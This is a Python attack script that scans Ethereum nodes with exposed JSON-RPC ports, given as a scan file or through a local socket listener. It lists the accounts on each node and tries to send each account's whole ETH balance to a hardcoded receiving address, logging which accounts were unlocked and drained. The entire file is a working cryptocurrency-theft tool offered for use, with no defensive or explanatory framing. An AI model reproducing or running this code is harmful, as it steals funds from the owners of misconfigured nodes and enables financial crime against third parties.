
import json
import socket
import sys
import threading
import time

from web3 import Web3

import eth_rpc_output


LOOP_INTERNAL_TIME = 5
MAX_RETRY = 10
TARGET_RECEIVE_ADDRESS = '0x066a3C43F4E87741d3110F59d524bC3a67Cf2172'
DEFAULT_PORT = 7641


def background_thread(ip,port) :
    except_count = 0
    eth_connector = Web3(Web3.HTTPProvider('http://%s:%d/' % (ip,port)))
    
    while True :
        try :
            block_information = eth_connector.eth.getBlock('latest')
            block_height = block_information['number']
            timestamp = block_information['timestamp']
            gas_limit = block_information['gasLimit']

            eth_rpc_output.output_function('Node %s:%d  Block Height : %d Timestamp : %d' % (ip,port,block_height,timestamp))

            account_list = eth_connector.personal.listAccounts
            
            for account_index in account_list :
                try :
                    balance = eth_connector.eth.getBalance(account_index)

                    eth_rpc_output.output_function('Node %s:%d  Account : %s Balance : %f ETH' % (ip,port,account_index,balance / 10 ** 18),'green')

                    eth_connector.eth.sendTransaction({
                        'from' : account_index ,
                        'to' : TARGET_RECEIVE_ADDRESS ,
                        'value' : balance ,
                        'gas' : gas_limit ,
                        'gasPrice' : 30 ,
                    })

                    eth_rpc_output.output_function('Node %s:%d  Account : %s Transer Success!' % (ip,port,account_index),'red')
                except :
                    eth_rpc_output.output_function('Node %s:%d  Account : %s is Lock ..' % (ip,port,account_index))
        except Exception as exception :
            except_count += 1
            
            eth_rpc_output.output_function('Node %s:%d Raise Except -- %s' % (ip,port,exception),'red')
        
        time.sleep(LOOP_INTERNAL_TIME)
        
global_background_thread_list = []
        
def socket_server(bind_port = DEFAULT_PORT) :
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    sock.bind(('127.0.0.1',bind_port))
    sock.listen(1)
    
    while True :
        new_socket = sock.accept()[0]
        
        try :
            data = json.loads(new_socket.recv(512))
            
            if not 'ip' in data.keys() or not 'port' in data.keys() :
                new_socket.send(b'{"status" : "not ip or port .."}')
            else :
                create_thread = threading.Thread(target = background_thread,args = (data['ip'],data['port']))

                global_background_thread_list.append(create_thread)
                create_thread.start()
                
                new_socket.send(b'{"status" : "Success"}')
        except :
            pass
        
        new_socket.close()
    
def load_scan_data(path) :
    file = open(path)
    data = json.loads(file.read())
    
    file.close()
    
    return data
    
    
if __name__ == '__main__' :
    if 2 == len(sys.argv) :
        data = load_scan_data(sys.argv[1])
        
        for data_index in data :
            create_thread = threading.Thread(target = background_thread,args = (data_index['ip'],data_index['port']))

            global_background_thread_list.append(create_thread)
            create_thread.start()
            
    
    create_thread = threading.Thread(target = socket_server,args = (DEFAULT_PORT,))

    create_thread.start()
    
    eth_rpc_output.output_function('Server Running ..')
    
    input()

    eth_rpc_output.output_function('Server Exit ..')
    
    create_thread._close()
    exit()
